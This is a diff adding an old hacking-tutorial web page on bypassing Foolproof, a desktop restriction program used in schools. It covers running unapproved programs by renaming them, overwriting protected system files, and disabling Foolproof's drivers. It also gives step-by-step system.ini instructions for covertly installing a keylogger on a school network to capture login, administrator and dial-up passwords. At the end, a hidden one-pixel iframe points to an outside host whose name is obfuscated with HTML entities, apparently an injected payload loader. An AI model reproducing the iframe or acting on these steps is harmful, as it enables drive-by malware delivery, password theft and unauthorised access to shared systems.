@@ -1,0 +1,161 @@
+<html>
+<head>
+<title>foolproof 2</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>Fooling Foolproof</b>       I   Written by:     /
+    >                     I                             I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   Tix0            \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<p>&nbsp;</p>
+<p>DISCLAIMER:<br>
+I hate those disclaimers. As if anything my sorry, non-lawyer (is that a word?) self
+could write here would prevent myself from being responsible. All i have to say is dont do anything
+harmful, and if you do, you're on your own.</p>
+
+<hr>
+<h3>Sections:</h3>
+<ul>
+  <li><a href="#1">What is Foolproof?</a></li>
+  <li><a href="#2">Why Foolproof sucks.</a></li>
+  <li><a href="#3">How to get around Foolproof.</a></li>
+  <!--<li><a href="#4">How to disable/destroy Foolproof.</a></li>-->
+  <li><a href="#5">My personal path.</a></li>
+</ul>
+<hr>
+<a name="1"><h3>What is Foolproof?</h3>
+<p>Foolproof is a Windoze desktop security program, used almost exclusivly by schools, or any other large
+institution where the people using terminals on a network (or even lone terminals) are not trusted to use the computers
+freely. It is a configurable program, and depending on the amount of precautions taken, certain actions are restricted.
+Such actions include when one right clicks, all actions other than arranging icons are disabled. Although an
+understandable precaution on a winblows box, it is more than the least bit annoying for anyone who uses computers for
+more than checking their e-mail or playing java games. Another rather pesky feature, is the inability to run any
+program that has not been previously okayed by administrators.</p>
+<hr>
+<a name="2"><h3>Why Foolproof sucks.</h3>
+<p>Foolproof is not only annoying, but insulting. Ever since the days of The ICSS (Incompatable Time-Sharing
+System) in Tech-square at MIT, any program or routine a computer is made to preform that prevents or restricts the full
+power and capabilities of the computer, is foolish, insulting, and more than a little annoying. Although I too, should
+I find myself in charge of a network as large as the one in my former school, would cringe at the mere thought of 900
+students, who know as little about computers as they do anything else, and the constant worry that they might download
+a canned hacking program and actually do damage. However, I feel that the use of computers is a priviledge, and
+comprimises must be made and the student body made aware of the limitations and appropriate uses of the system.
+Although my school had such an acceptable use policy, it was far too harse, limiting use of computers beyond what
+Foolproof ever did.</p>
+<hr>
+<a name="3"><h3>How to get around Foolproof.</h3>
+<blockquote>
+  <p><b>-Running Programs-</b></p>
+</blockquote>
+<p>Here is where our adventures turn interesting. Foolproof, though initially intimidating, has many gaping holes.
+First, and most the easiest to exploit, is the fact that the routine that checks to mack sure a program is previously
+allowed is not path specific; in fact, it uses no recognition techniques other than the name, so by simply renaming
+your program to an allowed program, such as winword.exe (microsoft word) you can run it- and in the executeable logs,
+nothing unusual appears. This is probably the biggest vulnerability, especially considering that it is so simple, any
+idiot who stumbles across such a loophole could do significant damage to the system. But we don't do that. We're
+hackers.</p>
+<blockquote>
+  <p><b>-Editing System Files-</b></p>
+</blockquote>
+<p>Although this varies depending on the individual system's configuration, most system files, such as system.ini,
+or autoexec.bat; both very important to the informed individual, are read only. As Foolproof is a boot sector program,
+it is often impossible to boot into ms-dos, to change file permissions. Ms-dos prompts are also restricted. Thus, if
+one wishes to alter such a file, do this: First, you can see the contents of the file- just open it in microsoft word
+(notepad is often disallowed;-) and save it as a txt file. Take it home, and make the necessary alterations, careful
+not to do damage(!!!!), make a backup, and (heres the funny part) upload it to an online drive- you know- a free hard
+drive on the internet such as www.xdrive.com. If you just brought the file into school on a disk, you couldnt move it
+into the folder to replace the existing file, or use any other method to switch them, but, when downloading files, one
+is given the option of REPLACING EXISTING FILES! Jackpot. Now, you can make those changes to run your C++ compiler,
+winword.exe (wink wink), without typing in that whole long ms-dos command. Yes yes, there are more malicious uses for
+such system file editing, but we wont do that. We're hackers.</p>
+<blockquote>
+  <p><b>-Fooling with Foolproof-</b></p>
+</blockquote>
+<p>Now, I have never done this myself, and i certainly cannot condone a course of action which would harm a
+system, but there are ways to actually remove foolproof, or "0wN" it, if you will. These vary from subtle editing, to
+simple overwriting or removing.</p>
+<p>First of all, with some programs, it is possible to simply ctrl-alt-delete and close the program- not so with
+foolproof. If you see it as an available program, it will not end if you close it. Worth a try though.</p>
+<p>The next thing you do requires some research. The default directory for Foolproof is C:\Sss, so look around-
+you will find some .vxd files, and other interesting material. Look around. I never went so far as to actually edit
+these, but one could easily use the way of editing system files shown above to rewrite these to his/her liking. Among
+the files you will find are several .ini files detailing programs which are allowed- and other interesting permission
+material.</p>
+<p>If you wanted to, you could just make a blank .vxd file, with the same name, and replace the existing virtual
+device drivers of foolproof, so that they no longer preform their intended functions. In fact, you could completely
+eliminate the system this way. Unfortunatly, there will undoubtably be unforseen side effects of this, and do so at
+your own risk (or better yet, dont).</p>
+<hr>
+<a name="5"><h3>My Personal Path.</h3>
+<p>Using the methods outlined above, I decided that the best way for me to obtain full access of the schools
+Client/server NT network, was to install a keylogger. Sure, how lame. Maybe so, but they certainly serve a purpose. I
+could have downloaded a crappy program, but i went top of the line, and actually bought (not cracked- programmers need
+to eat also) a program called "International Keylogger Stealth," by Amecisco Ind., available at ameciso.com, or
+Keylogger.com. This program, herein after referred to as "iks" was perfectly tailered to my needs. It was a boot sector
+program, and instead of using an automatic installer, you could install it just by downloading the .vxd file to the
+windows\system folder, and then an edited system.ini file (see below)  with 2 entries added. Then, you just place a
+file called iks.dat, or anything else .dat somewhere on the comp, and specify the name and path in system.ini. This
+way, the .vxd file logs every keystroke, including NT login passwords in an encyrped form to the dat file. If someone
+were to open the dat file in winword or notepad, it would be unreadable, displaying random characters. However, if you
+upload the .dat file to your drive and download it at home, and then you run a program called datview.exe, which
+decyrpts it and reveals all contained within. Now, you can use other usernames or even admins passwords to have more
+fun. The golden fleece of this method is if you can get an admins to run foolproof's .exe program, which after prompted
+for a password, one can edit the configuration of foolproof. If you get this, you can do whatever you want. Also, this
+way you get all the benifits of keyloggers on public terminals, including the devious dial-up passwords, and other
+acoount information. But dont mis-use it. After all. We're hackers.</p>
+<blockquote>
+  <p>The System.ini installation.</p>
+</blockquote>
+<ol>
+  <li>There are two files you should know about:<br>
+           vikxd.vxd   --- the virtual device driver that logs all keystrokes<br>
+           datview.exe --- the translator to generate the text file from binary log</li>
+  <li>Let's suppose that you want iks to log to c:\kitkat\kitkat1.dat, here is what you can do:
+    <ol>
+      <li>Copy vikxd.vxd to c:\windows\system;</li>
+      <li>Edit c:\windows\system.ini, in [386Enh] section, add two entries<br>
+        "device=vikxd.vxd" and "VikxdLog=c:\kitkat\kitkat1.dat". So it looks<br>
+        like:<br>
+        ......<br>
+        [386Enh]<br>
+        (other entries)<br>
+        (other entries)<br>
+        device=vikxd.vxd<br>
+        VikxdLog=c:\kitkat\kitkat1.dat<br>
+        ......</li>
+      <li>Reboot.</li>
+    </ol></li>
+</ol>
+<hr>
+<div align="center">
+<table width="100%">
+<tr>
+  <td align="right" width="50%">EOF</td>
+  <td>&nbsp;</td>
+
+</table>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
